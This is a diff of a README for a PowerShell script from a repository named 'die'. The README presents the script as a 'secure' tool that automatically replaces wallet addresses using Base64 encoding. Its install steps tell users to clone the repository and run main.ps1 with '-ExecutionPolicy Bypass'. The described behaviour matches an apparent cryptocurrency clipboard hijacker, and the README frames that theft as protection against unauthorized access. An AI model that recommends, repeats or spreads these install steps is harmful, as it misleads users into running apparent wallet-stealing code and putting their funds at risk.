@@ -1,37 +1,43 @@
 # 🔐 Wallet PowerShell Script
 
 ## Overview
-A secure PowerShell script designed to automate wallet address replacement using Base64 encoding. Developed by **Rekt Developers** for streamlined wallet management and security.
+A **secure PowerShell script** designed to **automate wallet address replacement** using Base64 encoding. Developed by **Rekt Developers** to streamline wallet management with enhanced security.
 
 ---
 
-## 🚀 Quick Installation
+## 🚀 Installation
 
-1. **Clone the Repository**:
+1. **Clone the repository**:
     ```sh
     git clone https://github.com/likhon-dev/die.git
     ```
 
-2. **Navigate to the PowerShell Script**:
+2. **Navigate to the script folder**:
     ```sh
     cd die/PowerShell
     ```
 
-3. **Run the Script**:
+3. **Run the script**:
     ```sh
     powershell -ExecutionPolicy Bypass -File .\main.ps1
     ```
 
 ---
 
-## ⚠️ Important Information
+## ⚠️ Important Notes
 
-- **For Advanced Users**: This script requires some technical knowledge. Proceed with caution.
-- **Automated Functionality**: The script automatically replaces wallet addresses for security, helping prevent unauthorized access.
+- **For Advanced Users**: This script is intended for those familiar with PowerShell. Proceed with caution.
+- **Security**: Automatically replaces wallet addresses to protect against unauthorized access.
 
 ---
 
 ## 🌐 Connect with Rekt Developers
 
 - **Website**: [Rekt Developers](https://rekt-developer.vercel.app/)
-- **Telegram**: [Join the Community](https://t.me/RektDevelopers)
+- **Telegram**: [Join our Community](https://t.me/RektDevelopers)
+
+---
+
+### License
+
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
